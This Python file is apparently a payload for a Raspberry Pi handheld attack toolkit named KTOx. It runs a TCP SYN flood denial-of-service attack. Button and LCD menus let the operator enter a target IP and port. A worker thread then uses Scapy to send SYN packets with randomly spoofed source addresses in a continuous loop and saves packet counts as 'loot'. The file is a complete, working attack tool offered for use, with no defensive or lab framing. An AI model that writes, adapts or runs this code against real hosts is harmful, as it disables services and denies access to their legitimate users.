#!/usr/bin/env python3
"""
KTOx *payload* – **DoS: TCP SYN Flood**
==========================================
This payload performs a TCP SYN Flood attack, a type of Denial of Service (DoS)
that aims to exhaust the resources of a target server by sending a large number
of SYN requests with spoofed source IP addresses. The server attempts to respond
to these non-existent clients, eventually filling its connection table and
preventing legitimate connections.

Features:
- Interactive UI for entering target IP address and port.
- Uses Scapy to craft and send spoofed SYN packets.
- Displays current status (ACTIVE/STOPPED) and packet count on the LCD.
- Graceful exit via KEY3 or Ctrl-C, ensuring the attack is stopped.

Controls:
- MAIN SCREEN:
    - OK: Start SYN Flood.
    - KEY1: Edit Target IP.
    - KEY2: Edit Target Port.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
- PORT INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm Port.
    - KEY3: Cancel Port input.
- ATTACKING SCREEN:
    - OK: Stop Attack.
    - KEY3: Stop Attack and Exit.
"""
import sys
import os
import time
import signal
import subprocess
import threading
import random

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
# Also add wifi subdir if present
_wifi_dir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
    sys.path.insert(0, _wifi_dir)

# ----------------------------
# Third-party library imports 
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    print("ERROR: Hardware libraries (RPi.GPIO, LCD, PIL) not found.", file=sys.stderr)
    print("Please run 'sudo pip3 install RPi.GPIO spidev Pillow'.", file=sys.stderr)
    sys.exit(1)

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print("ERROR: Scapy library not found.", file=sys.stderr)
    print("Please run 'sudo pip3 install scapy'.", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# KTOx WiFi Integration
# ----------------------------
try:
    from wifi.ktox_integration import get_best_interface
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface():
        return "eth0" # Fallback

TARGET_IP = "192.168.1.1"
TARGET_PORT = "80"
# Loot directory under KTOx
LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'dos_syn_flood')
os.makedirs(LOOT_DIR, exist_ok=True)

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
current_ip_input = TARGET_IP
ip_input_cursor_pos = 0
current_port_input = str(TARGET_PORT)
port_input_cursor_pos = 0

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=2)
        save_loot_snapshot()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def save_loot_snapshot():
    try:
        ts = time.strftime('%Y-%m-%d_%H%M%S')
        loot_file = os.path.join(LOOT_DIR, f'syn_flood_{TARGET_IP}_{TARGET_PORT}_{ts}.txt')
        with open(loot_file, 'w') as f:
            f.write('TCP SYN Flood\n')
            f.write(f'Target: {TARGET_IP}:{TARGET_PORT}\n')
            f.write(f'Packets sent: {packet_count}\n')
            f.write(f'Timestamp: {ts}\n')
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"[WARN] Failed to write loot: {e}", file=sys.stderr)

def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status: str = ""):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "TCP SYN Flood", font=FONT_TITLE, fill=(231, 76, 60))
    d.line([(0, 22), (128, 22)], fill=(231, 76, 60), width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill=(242, 243, 244))
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 65), "Target Port:", font=FONT, fill=(242, 243, 244))
        d.text((5, 80), str(TARGET_PORT), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 115), "OK=Start | KEY1=Edit IP | KEY2=Edit Port | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    elif screen_state == "port_input":
        d.text((5, 30), "Enter Target Port:", font=FONT, fill=(242, 243, 244))
        display_port = list(current_port_input)
        if port_input_cursor_pos < len(display_port):
            display_port[port_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_port), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
        d.text((5, 60), "Packets Sent:", font=FONT, fill=(242, 243, 244))
        d.text((15, 75), str(packet_count), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    
    # The character set for IP address input
    char_set = "0123456789."
    char_index = 0
    
    input_ip = ""
    
    while running:
        # Draw the UI for IP input
        img = Image.new("RGB", (128, 128), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((5, 5), "Enter Target IP", font=FONT_TITLE, fill=(171, 178, 185))
        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)
        
        # Display the current input
        d.text((5, 40), f"IP: {input_ip}", font=FONT, fill=(242, 243, 244))
        
        # Display the character selection
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill=(212, 172, 13))
        
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill=(171, 178, 185))
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill=(171, 178, 185))
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            input_ip += char_set[char_index]
            time.sleep(0.2)

        if btn == "KEY1": # Backspace
            input_ip = input_ip[:-1]
            time.sleep(0.2)

        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)

        # Let's use KEY2 to confirm the IP
        if GPIO.input(PINS["KEY2"]) == 0:
            parts = input_ip.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return input_ip
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                input_ip = "" # Reset on invalid
        
        time.sleep(0.1)
    return None

def handle_port_input_logic(initial_port):
    global current_port_input, port_input_cursor_pos
    current_port_input = initial_port
    port_input_cursor_pos = len(initial_port) - 1
    
    draw_ui("port_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                return current_port_input
            else:
                show_message(["Invalid Port!", "Try again."], "red")
                time.sleep(2)
                current_port_input = initial_port
                port_input_cursor_pos = len(initial_port) - 1
                draw_ui("port_input")
        
        if btn == "LEFT":
            port_input_cursor_pos = max(0, port_input_cursor_pos - 1)
            draw_ui("port_input")
        elif btn == "RIGHT":
            port_input_cursor_pos = min(len(current_port_input), port_input_cursor_pos + 1)
            draw_ui("port_input")
        elif btn == "UP" or btn == "DOWN":
            if port_input_cursor_pos < len(current_port_input):
                char_list = list(current_port_input)
                current_char = char_list[port_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[port_input_cursor_pos] = str(digit)
                    current_port_input = "".join(char_list)
                draw_ui("port_input")
        
        time.sleep(0.1)
    return None

def syn_flood_worker():
    global packet_count
    while not attack_stop_event.is_set():
        spoofed_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        p = IP(src=spoofed_ip, dst=TARGET_IP) / TCP(sport=RandShort(), dport=int(TARGET_PORT), flags="S")
        send(p, verbose=0)
        packet_count += 1
        time.sleep(0.01)

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        attack_thread = threading.Thread(target=syn_flood_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)
    # Save summary loot on stop
    try:
        os.makedirs(LOOT_DIR, exist_ok=True)
        ts = time.strftime('%Y-%m-%d_%H%M%S')
        loot_file = os.path.join(LOOT_DIR, f'summary_{TARGET_IP}_{TARGET_PORT}_{ts}.txt')
        with open(loot_file, 'w') as f:
            f.write(f'Target: {TARGET_IP}:{TARGET_PORT}\n')
            f.write(f'Packets sent: {packet_count}\n')
    except Exception as e:
        print(f'[WARN] Failed to write loot: {e}', file=sys.stderr)

if __name__ == "__main__":
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), (10, 0, 0))
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)

    try:
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if attack_thread and attack_thread.is_alive():
                draw_ui("attacking", "ACTIVE")
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    stop_attack()
                    cleanup()
                    break
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    stop_attack()
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                time.sleep(0.1)
            else:
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    start_attack()
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    new_ip = handle_ip_input_logic(TARGET_IP)
                    if new_ip:
                        TARGET_IP = new_ip
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    new_port = handle_port_input_logic(str(TARGET_PORT))
                    if new_port:
                        TARGET_PORT = new_port
                    time.sleep(BUTTON_DEBOUNCE_TIME)

            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("SYN Flood payload finished.")